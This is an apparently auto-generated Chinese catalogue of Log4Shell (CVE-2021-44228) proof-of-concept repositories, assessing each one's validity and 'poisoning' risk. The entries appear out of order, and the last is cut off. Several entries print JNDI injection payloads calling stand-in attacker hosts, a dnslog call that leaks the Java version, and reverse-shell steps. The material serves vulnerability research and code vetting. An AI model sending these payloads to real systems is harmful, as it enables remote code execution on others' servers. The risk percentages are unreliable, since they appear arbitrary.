**来源**: [CVE-2021-44228-sec13b_CVE-2021-44228-POC.md](../2021/CVE-2021-44228-sec13b_CVE-2021-44228-POC.md)

## CVE-2021-44228-Log4Shell-RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** Apache Log4j2

**危害等级:** 极高危，可导致服务器完全控制

**影响版本:** <= 2.14.1 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用存在漏洞的Log4j2版本，且允许攻击者控制日志消息或日志消息参数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是一个严重的远程代码执行漏洞，存在于Apache Log4j2中。攻击者可以通过构造特殊的JNDI注入字符串，例如`${jndi:ldap://attacker.com/evil}`，当Log4j2记录此字符串时，会尝试通过JNDI从攻击者控制的LDAP服务器下载并执行恶意代码。这个漏洞利用的关键在于Log4j2的lookup substitution功能允许在日志消息中使用JNDI查找。漏洞库信息、搜索引擎结果和提供的PoC代码都证实了此漏洞的严重性和利用方式。

**有效性：**
提供的YAML格式的PoC代码有效，针对不同的应用场景（Apache Druid, Apache JSPWiki, CAS, Code42, Elasticsearch等）构造了特定的payload，通过发送包含JNDI注入字符串的请求，触发漏洞。

**投毒风险：**
PoC代码本身的主要目的是验证漏洞的存在，但存在一定的投毒风险。虽然PoC中执行的恶意代码通常是用于验证目的，例如回连攻击者的服务器，但如果攻击者篡改这些PoC，可以将payload替换为更具破坏性的恶意代码，比如植入后门、窃取敏感信息或进行拒绝服务攻击。由于PoC文件来自未经审核的第三方源，存在作者在payload中植入恶意代码的可能性。因此，在使用这些PoC时，需要仔细审查代码，确保其安全性。

风险评估：
* 代码结构和目标：PoC文件结构清晰，目标明确，针对已知漏洞利用。恶意行为的风险较低，因为代码的目的是为了复现漏洞，而不是隐藏恶意功能。
* 外部依赖：几乎没有外部依赖项，降低了引入恶意代码的可能性。
* 权限要求：这些 PoC 需要具有执行网络请求的权限，这增加了潜在的风险，因为它们可能被用来发起对内部网络的攻击或数据泄露。
* 代码审查：代码可读性高，易于审查。这意味着可以相对容易地识别和删除任何潜在的恶意代码。

综合以上因素，我给出的投毒风险是 10%。

**利用方式：**
1.  **确定目标系统：** 找到使用存在漏洞的Log4j2版本的应用程序。
2.  **构造恶意Payload：**  构建包含JNDI注入的Payload，例如`${jndi:ldap://attacker.com/evil}`。其中`attacker.com`是攻击者控制的服务器，`evil`是LDAP服务器上的恶意代码。
3.  **发送Payload：** 将Payload插入到应用程序的日志消息中。这可以通过多种方式实现，例如：
    *   HTTP请求头（User-Agent, X-Forwarded-For等）
    *   POST请求参数
    *   URL参数
    *   任何可能被应用程序记录的输入
4.  **利用JNDI执行恶意代码：**  当Log4j2记录包含Payload的消息时，会尝试通过JNDI从`attacker.com`下载并执行恶意代码。
5.  **反向shell获取权限：**  恶意代码通常会启动一个反向shell，允许攻击者远程控制目标系统。

提供的PoC代码针对特定应用（Druid, JSPWiki, CAS, Code42, Elasticsearch）的特定URI或HTTP头构造包含恶意JNDI字符串的请求，如果目标应用存在漏洞，且使用Log4j2记录相关请求信息，则可触发漏洞，实现远程代码执行。

**项目地址:** [sec13b/CVE-2021-44228-POC](https://github.com/sec13b/CVE-2021-44228-POC)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #36

**来源**: [CVE-2021-44228-srcporter_CVE-2021-44228.md](../2021/CVE-2021-44228-srcporter_CVE-2021-44228.md)

## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）

**利用条件:** 需要目标系统使用受影响版本的 Log4j2，且允许 JNDI 查找

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 漏洞存在于 Apache Log4j2 中，由于 JNDI 功能未对攻击者控制的 LDAP 和其他 JNDI 相关端点进行保护。攻击者可以通过控制日志消息或日志消息参数，在启用了消息查找替换的情况下，执行从 LDAP 服务器加载的任意代码。

**有效性：** 根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，该漏洞是有效的。 搜索引擎结果显示了许多关于此漏洞的分析、利用和缓解措施的讨论。提供的 Dockerfile 和构建脚本表明可以构建一个包含漏洞的应用程序。

**利用方式：**

1.  攻击者将恶意 JNDI 查找字符串注入到应用程序的日志消息中。例如，通过 HTTP 请求的 User-Agent 头部或 POST 请求的参数。
2.  Log4j2 尝试解析日志消息，遇到 JNDI 查找字符串，例如 `${jndi:ldap://attacker.com/evil}`。
3.  Log4j2 通过 JNDI 连接到攻击者控制的 LDAP 服务器 (attacker.com)。
4.  LDAP 服务器返回一个包含恶意 Java 类的 URL。
5.  Log4j2 下载并执行该恶意 Java 类，从而导致远程代码执行。

**投毒风险：**提供的代码库旨在创建一个包含 Log4Shell 漏洞的示例应用程序，用于安全测试。虽然代码本身直接显示了漏洞的存在，但仍然存在一些轻微的投毒风险，主要集中在以下几点：

*   **依赖项混淆:** 恶意修改`pom.xml`或其他构建脚本,引入包含恶意代码的其他依赖项。
*   **构建脚本后门:** 在`build.sh`或Dockerfile中添加额外的命令,在构建过程中植入后门。
*   **ClassLoader Manipulation:** 理论上，可以修改应用程序的类加载器，动态加载和执行恶意代码，但这需要对Java内部机制有深入的了解，并且更难检测。
    
    考虑到这些风险，我认为此代码库存在约10%的投毒风险，因为即使是示例代码也可能被用于传播恶意负载。

**项目地址:** [srcporter/CVE-2021-44228](https://github.com/srcporter/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #37

**来源**: [CVE-2021-44228-tadash10_Exploiting-CVE-2021-44228-Log4Shell-in-a-Banking-Environment.md](../2021/CVE-2021-44228-tadash10_Exploiting-CVE-2021-44228-Log4Shell-in-a-Banking-Environment.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell 远程代码执行漏洞

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行、数据泄露和服务器完全控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用了受影响版本的 Log4j2 并且允许 JNDI 查找，攻击者能够控制 Log4j2 记录的日志消息或日志消息参数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞，攻击者可以通过注入恶意的 JNDI 查找字符串到日志消息中，利用此漏洞执行任意代码。漏洞原理是 Log4j2 允许在日志消息中使用 JNDI 查找功能，如果启用了消息查找功能，攻击者可以控制日志消息或日志消息参数，从而导致从 LDAP 服务器加载并执行任意代码。

**漏洞利用方式：**

1.  **攻击者构造恶意请求：** 攻击者发送包含特定格式的字符串的请求，例如 `${jndi:ldap://attacker.com/evil}`，这个字符串会被记录到 Log4j2 的日志中。
2.  **Log4j2 解析 JNDI 字符串：** 当 Log4j2 尝试记录包含 `${jndi:ldap://attacker.com/evil}` 的消息时，它会尝试解析 JNDI 字符串。
3.  **JNDI 查找：** Log4j2 通过 JNDI 接口连接到攻击者控制的 LDAP 服务器 `attacker.com`。
4.  **加载恶意代码：** LDAP 服务器返回一个包含恶意 Java 类的引用。
5.  **执行任意代码：** Log4j2 加载并执行该恶意 Java 类，从而导致远程代码执行。

**有效性：**
根据漏洞描述和搜索引擎结果，该漏洞的POC代码有效，可以实现远程代码执行。

**投毒风险：**
该漏洞利用代码存在一定的投毒风险。提供的`README.md`文件描述了利用过程，但其中包含的payload (Socket appender) 有可能被用于数据窃取。尽管主要目的是演示RCE，但通过`SerializedLayout`将日志事件发送到攻击者服务器，实际上意味着任何被记录的数据（包括潜在的敏感信息）都可能被泄露。因此，存在一定风险。

**风险评估依据：**
提供的POC专注于建立Socket连接并将序列化的数据发送到远程服务器，这意味着它可以用来构建一个后门，泄露信息或者植入更深层次的恶意代码。

**综上所述，虽然POC的目的是演示Log4Shell漏洞，但其中利用Socket appender 和 SerializedLayout的行为,存在潜在的投毒行为，因此投毒风险不容忽视。**

**项目地址:** [tadash10/Exploiting-CVE-2021-44228-Log4Shell-in-a-Banking-Environment](https://github.com/tadash10/Exploiting-CVE-2021-44228-Log4Shell-in-a-Banking-Environment)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #38

**来源**: [CVE-2021-44228-thomaspatzke_Log4Pot.md](../2021/CVE-2021-44228-thomaspatzke_Log4Pot.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 极其高危，可导致完全控制受影响的系统

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序必须使用受影响的 Log4j2 版本，且允许攻击者控制记录的日志消息或日志消息参数。JNDI lookup substitution 必须启用 (2.15.0 之前默认启用)。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228，也被称为 Log4Shell，是一个存在于 Apache Log4j2 中的远程代码执行漏洞。该漏洞源于 Log4j2 允许在日志消息中使用 JNDI (Java Naming and Directory Interface) 查询。当 Log4j2 尝试解析包含特定格式字符串（例如 `${jndi:ldap://attacker.com/evil}`）的日志消息时，它会尝试通过 JNDI 从指定的 LDAP 服务器检索并执行恶意代码。

**有效性：**
根据漏洞库信息、搜索结果和漏洞利用的广泛性，此漏洞的 POC 代码非常有效。

**投毒风险：**
提供的“漏洞利用代码”仅仅是一个 GNU GPL 协议的 LICENSE 文件，本身不包含任何可执行的代码或恶意指令。因此，基于这份文件，投毒风险为 0%。

**利用方式：**
1.  **攻击者注入恶意 JNDI 字符串：** 攻击者需要在应用程序能够记录的任何输入点注入包含 JNDI 查找的恶意字符串。这可能包括 HTTP 请求头（例如 `User-Agent`、`X-Forwarded-For`）、POST 请求参数、WebSocket 消息等。
2.  **Log4j2 记录日志：** 当应用程序使用 Log4j2 记录包含恶意 JNDI 字符串的日志消息时，Log4j2 会尝试解析该字符串。
3.  **JNDI 查找：** Log4j2 会触发 JNDI 查找，尝试连接到攻击者控制的 LDAP 或其他 JNDI 相关服务器。
4.  **远程代码执行：** 攻击者的 JNDI 服务器会返回一个包含恶意 Java 类的响应。Log4j2 会加载并执行该 Java 类，导致远程代码执行。攻击者可以利用此漏洞在目标系统上执行任意命令。

**缓解措施：**
*   升级到 Log4j2 的修复版本（2.16.0 或更高版本，或者 2.12.2、2.12.3 或 2.3.1）。
*   如果无法升级，可以设置 `log4j2.formatMsgNoLookups` 为 `true` 来禁用消息查找，或者删除 `JndiLookup` 类。

综上所述，CVE-2021-44228 是一个极其严重的安全漏洞，利用方式简单，影响范围广泛，需要立即进行修复。

**项目地址:** [thomaspatzke/Log4Pot](https://github.com/thomaspatzke/Log4Pot)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #39

**来源**: [CVE-2021-44228-winnpixie_log4noshell.md](../2021/CVE-2021-44228-winnpixie_log4noshell.md)

## CVE-2021-44228 Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用受影响的 Log4j2 版本，且允许记录用户可控的数据。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞，它允许未经身份验证的攻击者执行远程代码。攻击者可以通过将恶意 JNDI 注入字符串插入到 Log4j2 记录的日志消息中来利用此漏洞。当 Log4j2 尝试解析此字符串时，它会向攻击者控制的 LDAP 或其他 JNDI 端点发起请求，从而允许攻击者执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞的 POC 代码非常有效。大量的安全厂商和研究人员都确认了此漏洞的存在和可利用性。提供的“Log4NoShell”代码实际上是一个缓解工具，通过禁用 Log4j2 的 JNDI 查找来防止漏洞被利用。它本身不是exploit，而是防御手段。

**投毒风险：**

分析提供的缓解工具代码，该代码主要功能是通过Java Agent禁用Log4j的JNDI lookup功能，本身不存在恶意代码。但是，任何第三方提供的工具都存在潜在的投毒风险。代码中使用了 ASM 字节码操作库，有一定的复杂性，增加了审查的难度。 因此，尽管表面上是防御工具，仍然存在一定的风险，建议在使用前仔细审查代码。

 风险评估：5%。

**利用方式：**

1.  攻击者识别使用易受攻击的 Log4j2 版本的应用程序。
2.  攻击者将包含恶意 JNDI 注入字符串（例如 `${jndi:ldap://attacker.com/evil}`）的输入发送到应用程序，确保该输入会被 Log4j2 记录下来。输入的途径包括但不限于：HTTP头（User-Agent, X-Forwarded-For等），POST请求体，URL参数等
3.  Log4j2 尝试解析该字符串，并向攻击者控制的 LDAP 服务器发起请求。
4.  攻击者的 LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行该恶意 Java 类，从而允许攻击者执行任意代码。

**项目地址:** [winnpixie/log4noshell](https://github.com/winnpixie/log4noshell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #40

**来源**: [CVE-2021-44228-x1ongsec_CVE-2021-44228-Log4j-JNDI.md](../2021/CVE-2021-44228-x1ongsec_CVE-2021-44228-Log4j-JNDI.md)

## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行和完全系统控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用了受影响的Log4j2版本，且允许外部JNDI查找

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是一个存在于 Apache Log4j2 中的严重远程代码执行漏洞。攻击者可以通过控制日志消息或日志消息参数，利用 JNDI 功能执行从 LDAP 服务器加载的任意代码。该漏洞利用 JNDI 注入，攻击者将包含恶意 JNDI 查找的字符串发送到应用程序，Log4j2 解析并执行该字符串，从而导致远程代码执行。

**有效性：**
提供的POC代码有效。它展示了如何使用 JNDI 注入漏洞利用 Log4j2。该代码提供了一个简单的 Spring Boot 应用程序，用于触发漏洞，并提供了一个利用有效载荷的示例。

**投毒风险：**
此仓库中作者隐藏投毒代码的风险较低。`README.md` 中提示的payload执行的是打开计算器程序的操作，虽然不是恶意操作，但仍需警惕。另外，`pom.xml` 文件声明依赖了 `log4j-api` 和 `log4j-core` 2.14.1版本，这是一个受漏洞影响的版本，为复现漏洞提供环境。`VulController.java` 中定义了触发漏洞的端点 `/vul`，并使用 `log.info` 记录请求参数。这个简单的应用程序本身不包含任何隐藏的恶意代码，仓库目的是复现CVE-2021-44228。 但无法完全排除作者添加了不易察觉的后门的可能。风险评估为 10%。

**利用方式：**
利用方式如下：
1.  攻击者找到一个使用了 Log4j2 且允许外部 JNDI 查找的应用程序。
2.  攻击者将一个包含恶意 JNDI 查找的字符串（例如 `${jndi:ldap://your_ip:port/xxx}`）注入到应用程序可以记录的任何输入字段（例如 HTTP Header、POST 参数等）。
3.  当 Log4j2 尝试记录该字符串时，它会解析 JNDI 查找，并尝试连接到攻击者控制的 LDAP 服务器。
4.  攻击者的 LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行该恶意 Java 类，从而导致远程代码执行。

**项目地址:** [x1ongsec/CVE-2021-44228-Log4j-JNDI](https://github.com/x1ongsec/CVE-2021-44228-Log4j-JNDI)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #41

**来源**: [CVE-2021-44228-yadavmukesh_Log4Shell-vulnerability-CVE-2021-44228-.md](../2021/CVE-2021-44228-yadavmukesh_Log4Shell-vulnerability-CVE-2021-44228-.md)

## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许攻击者完全控制受影响的系统

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2、2.12.3 和 2.3.1)

**利用条件:** 目标系统使用了受影响版本的 Log4j2，且允许消息查找替换。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞，攻击者可以通过控制日志消息或日志消息参数，从 LDAP 服务器加载并执行任意代码。漏洞利用方式是向服务器发送包含特定格式的 JNDI 注入payload的请求，例如 `${jndi:ldap://malicious-server.com/exploit}`。如果 Log4j2 记录了该请求，它会尝试解析该字符串，从而触发 JNDI 查找并从恶意服务器下载和执行代码。

**有效性：**
根据漏洞信息和搜索结果，该漏洞被广泛利用，POC代码有效。Unit 42、NVD、CrowdStrike、Sysdig、Oracle 等多个安全机构都发布了关于该漏洞的分析和缓解措施，证明了其真实性和危害性。

**投毒风险：**
提供的代码仓库主要侧重于使用机器学习方法检测Log4Shell攻击，而非直接的漏洞利用。尽管仓库中包含用于训练模型的日志数据和Python脚本，这些组件本身不太可能直接包含投毒代码。

风险在于：
1.  **数据污染：** 训练数据中可能包含精心构造的、旨在降低检测模型准确性的恶意日志条目（例如，通过添加混淆或规避技术），占比约5%。
2.  **依赖项风险：** `requirements.txt` 中列出的某些依赖项可能存在安全漏洞，但这不是作者的有意投毒。

总体而言，此代码仓库的投毒风险较低，约5%。

**利用方式：**
1.  攻击者将恶意 JNDI 注入 payload 插入到应用程序的日志消息中，例如通过 HTTP 请求头、POST 数据或其他用户可控的输入。
2.  如果应用程序使用存在漏洞的 Log4j2 版本记录此消息，Log4j2 会尝试解析 JNDI 字符串。
3.  Log4j2 触发 JNDI 查找，连接到攻击者控制的 LDAP 或 RMI 服务器。
4.  恶意服务器返回一个包含 Java 类的响应，该类包含攻击者想要执行的恶意代码。
5.  Log4j2 加载并执行该 Java 类，从而允许攻击者在目标系统上执行任意代码。

**缓解措施：**
*   升级 Log4j2 到 2.17.0 或更高版本。
*   禁用 JNDI 查找。
*   配置防火墙规则以阻止出站 LDAP 和 RMI 连接。

**项目地址:** [yadavmukesh/Log4Shell-vulnerability-CVE-2021-44228-](https://github.com/yadavmukesh/Log4Shell-vulnerability-CVE-2021-44228-)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---



---

## POC #16

**来源**: [CVE-2021-44228-Tai-e_CVE-2021-44228.md](../2021/CVE-2021-44228-Tai-e_CVE-2021-44228.md)

## CVE-2021-44228-Apache Log4j2-远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）

**利用条件:** 需要目标系统使用受影响的 Log4j2 版本，且允许JNDI 查找。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又称Log4Shell，是Apache Log4j2中的一个严重漏洞。攻击者可以通过控制日志消息或日志消息参数，利用 JNDI 注入执行任意代码。漏洞利用方式通常涉及在日志消息中插入包含恶意 JNDI 查找的字符串，例如 `${jndi:ldap://attacker.com/evil}`。当 Log4j2 处理此消息时，它会尝试通过 LDAP 从攻击者控制的服务器检索并执行代码。\n\n提供的漏洞利用代码是一个使用 Tai-e 静态分析工具来检测 Log4Shell 漏洞及其触发路径的项目。该项目本身不包含恶意代码，其目的是帮助安全研究人员和开发人员识别和修复受此漏洞影响的应用程序。但是，任何下载和使用漏洞利用代码的行为都存在一定的风险，因为可能存在其他未知的安全问题或依赖项。该项目使用了gradlew脚本，理论上存在一定的投毒风险，可能在编译的时候执行恶意代码，但从代码内容来看，直接投毒的可能性较低。主要风险在于构建脚本依赖的第三方库可能被篡改，导致潜在的供应链攻击。

根据漏洞库信息、搜索结果和漏洞利用代码，该漏洞的利用非常有效，影响广泛。需要尽快修复。


**项目地址:** [Tai-e/CVE-2021-44228](https://github.com/Tai-e/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #17

**来源**: [CVE-2021-44228-YangHyperData_LOGJ4_PocShell_CVE-2021-44228.md](../2021/CVE-2021-44228-YangHyperData_LOGJ4_PocShell_CVE-2021-44228.md)

## CVE-2021-44228 - Apache Log4j2 JNDI 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 极高危，可能导致完全控制受影响系统

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3 和 2.3.1)

**利用条件:** 目标系统使用受影响的 Log4j2 版本，并且允许出站网络连接访问攻击者控制的 LDAP 或其他 JNDI 端点。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是一个严重的远程代码执行漏洞，存在于 Apache Log4j2 中。攻击者可以通过发送特制的日志消息，利用 JNDI 注入漏洞，从恶意 LDAP 服务器加载并执行任意代码。

**有效性：**
提供的 POC 代码是有效的，它演示了如何利用此漏洞。它包含一个 Dockerfile，用于构建包含漏洞的 Tomcat 应用，以及一个 Python 脚本，用于自动化漏洞利用过程，包括设置恶意的 LDAP 服务器和 HTTP 服务器，并生成 Payload。

**投毒风险：**
尽管该存储库旨在作为概念验证，但仍存在一定的投毒风险。 虽然代码本身没有明显的恶意功能，但它简化了漏洞利用，这可能会增加被不道德行为者利用的风险。`poc.py` 脚本中的部分代码存在可疑行为，比如 Java 代码的字符串拼接，以及 `Proc` 类的调用，这些地方有可能隐藏恶意指令。 因此，投毒风险评估为 10%。使用此 PoC 时应采取预防措施，例如在隔离环境中进行。

**利用方式：**
1.  攻击者发送包含 JNDI 查找字符串（例如 `${jndi:ldap://attacker.com/evil}`）的特制日志消息。该字符串会被 Log4j2 解析。
2.  Log4j2 尝试通过 JNDI 连接到攻击者控制的 LDAP 服务器。
3.  LDAP 服务器响应，并返回一个 Java 类的 URL。
4.  Log4j2 下载并执行该 Java 类，从而允许攻击者在目标系统上执行任意代码。

该 POC 仓库提供了一个 Dockerfile 用来构建一个有漏洞的web应用，以及一个 Python 脚本，它模拟了攻击者的 LDAP 服务器和 Payload 生成器，并自动化了利用过程。攻击者需要监听一个端口来接受反向shell连接。 使用方法是在目标服务存在漏洞的地方插入恶意的 JNDI 字符串。

**项目地址:** [YangHyperData/LOGJ4_PocShell_CVE-2021-44228](https://github.com/YangHyperData/LOGJ4_PocShell_CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #18

**来源**: [CVE-2021-44228-ZacharyZcR_CVE-2021-44228.md](../2021/CVE-2021-44228-ZacharyZcR_CVE-2021-44228.md)

## CVE-2021-44228-Apache Log4j2-JNDI注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** JNDI注入

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 to 2.15.0 (不包括安全版本 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标应用程序使用受影响的Log4j2版本，并且允许消息查找替换

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞，它允许未经身份验证的远程代码执行。攻击者可以通过将恶意的 JNDI 查找字符串注入到 Log4j2 可以记录的任何输入中来利用此漏洞。当 Log4j2 尝试解析并执行该 JNDI 查找时，它可能会从攻击者控制的 LDAP 或其他 JNDI 相关端点加载任意代码。

**有效性：**
提供的 PoC 代码是有效的。它使用 `${jndi:dns://${sys:java.version}.z72ouf.dnslog.cn}` 格式的 JNDI 注入，该注入会触发 DNS 查询到 `z72ouf.dnslog.cn`，从而验证漏洞是否已成功利用。 `${sys:java.version}` 获取Java版本号。

**投毒风险：**
此仓库中不太可能存在作者隐藏的投毒代码（0%）。提供的文件看起来直接针对演示和利用 CVE-2021-44228 漏洞。 `pom.xml` 文件定义了 log4j-core 和 log4j-api 的依赖项。`log4j2.xml` 文件配置了基本的日志记录。 `CVE202144228.java` 文件包含利用该漏洞的有效负载，该负载会生成 DNS 查询以进行验证。 由于该PoC的主要作用是为了验证漏洞，而非植入后门，因此认为投毒风险低。

**利用方式：**
1.  攻击者找到应用程序中记录用户可控输入的位置。 这些位置可能包括 HTTP header，POST 数据，GET 参数等，总之，所有程序日志可以记录的地方。
2.  攻击者将恶意 JNDI 查找字符串（例如`${jndi:ldap://attacker.com/Exploit}`）注入到此输入中。
3.  当应用程序记录此输入时，Log4j2 会尝试解析 JNDI 查找。
4.  Log4j2 会连接到攻击者控制的 LDAP 服务器（或其他的 JNDI 服务）。
5.  攻击者的 LDAP 服务器返回一个包含恶意 Java 类的响应。
6.  Log4j2 加载并执行此恶意 Java 类，从而允许攻击者在目标系统上执行任意代码。
7. 缓解措施包括升级 Log4j2 到 >=2.17.0 版本，禁用 JNDI 查找，或设置 `log4j2.formatMsgNoLookups=true`。


**项目地址:** [ZacharyZcR/CVE-2021-44228](https://github.com/ZacharyZcR/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #19

**来源**: [CVE-2021-44228-arabindadora_log4shell.md](../2021/CVE-2021-44228-arabindadora_log4shell.md)

## CVE-2021-44228 Log4Shell RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 严重，允许未经身份验证的远程代码执行

**影响版本:** <= 2.14.1 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用受影响的Log4j版本，并且允许记录用户可控的输入，同时启用消息查找替换。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，也被称为Log4Shell，是一个存在于Apache Log4j2中的严重漏洞。该漏洞允许攻击者通过向日志消息或日志消息参数中注入恶意JNDI查找字符串，例如`${jndi:ldap://attacker.com/a}`，来执行任意代码。当Log4j2处理包含该字符串的日志消息时，它会尝试通过JNDI从攻击者控制的LDAP服务器检索Java对象。如果JVM配置允许，该对象将被反序列化并执行，从而导致远程代码执行。

**利用方式：**
1.  攻击者识别使用Log4j2且记录用户可控输入的应用程序。
2.  攻击者构造包含恶意JNDI查找的payload，并将其注入到应用程序可以记录的任何输入字段中（例如，HTTP头、表单参数等）。
3.  当应用程序记录包含恶意payload的输入时，Log4j2会尝试解析JNDI查找。
4.  Log4j2向攻击者控制的LDAP服务器发出请求。
5.  攻击者的LDAP服务器返回一个指向恶意Java类的引用。
6.  应用程序下载并执行恶意Java类，从而允许攻击者在目标系统上执行任意代码。

**评估POC代码：**
提供的PoC代码包含一个Dockerfile和Makefile，用于演示和利用CVE-2021-44228漏洞。Makefile包含用于构建Docker容器、启动/停止应用程序、触发漏洞利用和修补受害者应用程序的命令。`make exploit` 命令使用curl发送一个包含恶意JNDI payload的HTTP请求，该payload的目标是`${jndi:ldap://$(LHOST):$(LPORT)/a}`。该代码有效演示了漏洞利用。

**投毒风险：**
虽然PoC代码本身旨在演示和利用该漏洞，但任何从不受信任的来源下载的代码都存在潜在的风险。在本例中，投毒风险较低（约为10%），因为代码相对简单且易于审查。需要注意的是，Makefile的`exploit`命令和docker-compose.yml 中涉及的镜像如果被篡改，可能会引入恶意行为。用户应仔细检查所有代码，尤其是与网络连接和代码执行相关的部分，然后再执行PoC。代码中提供的Exploit.class ，本身就是一个后门代码,务必不要把POC验证的后门代码判定为投毒代码。docker-compose.yml 中涉及的镜像需要人工review.

**项目地址:** [arabindadora/log4shell](https://github.com/arabindadora/log4shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #20

**来源**: [CVE-2021-44228-asd58584388_CVE-2021-44228.md](../2021/CVE-2021-44228-asd58584388_CVE-2021-44228.md)

## CVE-2021-44228 Apache Log4j2 Log4Shell 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用受影响的Log4j2版本，允许记录用户可控的输入，且启用了message lookup substitution。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，也被称为Log4Shell，是Apache Log4j2中的一个严重漏洞。攻击者通过发送包含特定格式的恶意字符串（例如`${jndi:ldap://attacker.com/exploit}`）到应用程序，如果应用程序使用Log4j2记录该字符串，则Log4j2会尝试通过JNDI从攻击者控制的LDAP服务器检索恶意代码，并执行该代码。

**有效性：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，此漏洞的POC代码是有效的。大量报告表明该漏洞已被广泛利用。

**投毒风险：**
